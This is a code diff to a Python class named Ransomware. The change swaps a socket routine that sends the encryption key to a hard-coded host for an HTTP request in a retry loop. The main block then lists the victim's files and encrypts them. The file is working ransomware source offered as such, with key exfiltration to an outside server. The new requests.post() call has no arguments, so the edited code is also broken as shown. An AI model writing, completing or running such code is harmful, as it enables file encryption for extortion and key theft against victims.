@@ -11,7 +11,8 @@ from lib.modules import (
     safe_load
 )
 from lib.cryptography import Fernet
-from socket import socket
+from requests.exceptions import RequestException
+import requests
 
 
 
@@ -33,17 +34,15 @@ class Ransomware:
         retry_interval = 10
 
         while not connected and retries < max_retries:
-            with socket() as server:
-                try:
-                    server.connect((self.host, self.port))
-                    server.sendall(self.key)
-                    connected = True
-                except ConnectionError:
-                    retries += 1
-                    if retries < max_retries:
-                        sleep(retry_interval)
-                    else:
-                        Terminal.Reset()
+            try:
+                requests.post()
+                connected = True
+            except RequestException:
+                retries += 1
+                if retries < max_retries:
+                    sleep(retry_interval)
+                else:
+                    Terminal.Reset()
 
 
     def list_file(self) -> Dict[str, List[str]]:
@@ -87,6 +86,6 @@ class Ransomware:
 
 
 if __name__ == '__main__':
-    bot = Ransomware('192.168.1.12', 19100)
+    bot = Ransomware()
     bot.list_file()
     bot.encrypted()
